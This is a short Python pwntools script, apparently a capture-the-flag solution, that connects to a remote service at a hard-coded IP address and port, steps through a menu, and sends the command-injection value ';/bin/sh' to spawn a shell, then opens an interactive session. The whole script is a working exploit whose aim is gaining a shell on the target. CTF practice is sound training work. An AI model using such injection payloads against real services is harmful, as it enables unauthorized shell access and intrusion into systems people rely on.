from pwn import *
context(arch='amd64', os='linux', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 58215)
io.recv()
io.sendline(b'1')
io.recv()
io.sendline(b'hahaha')
io.recv()
io.sendline(b'5')
io.recv()
io.sendline(b'n')
io.recv()
io.sendline(b'3')
io.recv()
io.sendline(b"';/bin/sh'")
io.recv()
io.sendline(b'4')
io.interactive()